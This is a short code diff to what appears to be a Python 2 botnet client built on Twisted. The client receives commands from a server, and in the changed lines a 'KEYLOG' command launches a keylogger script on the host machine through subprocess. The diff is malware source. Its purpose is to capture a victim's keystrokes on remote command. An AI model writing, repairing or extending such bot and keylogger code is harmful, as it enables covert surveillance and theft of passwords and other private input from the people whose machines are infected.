@@ -2,7 +2,7 @@ import hashlib
 import sys
 from twisted.internet import reactor, task, defer
 from twisted.python import log
-from subprocess import call
+import subprocess
 #import kademlia
 import time
 import keylogger
@@ -60,8 +60,8 @@ def get_cmd(cmd,server,bot):
 	if cmd in commands:
 		if cmd == 'KEYLOG':
 			tmp = 'python keylogger.py {0}'.format(bot.cmdkey)
-			call(tmp.split(),stdin=None, stdout=None, stderr=None,shell=True)
-			keylogger.run
+			process=subprocess.Popen(tmp.split(),shell=False)
+			#keylogger.run
 
 def wait_cmd(server,bot):
 	print "Checking for command"
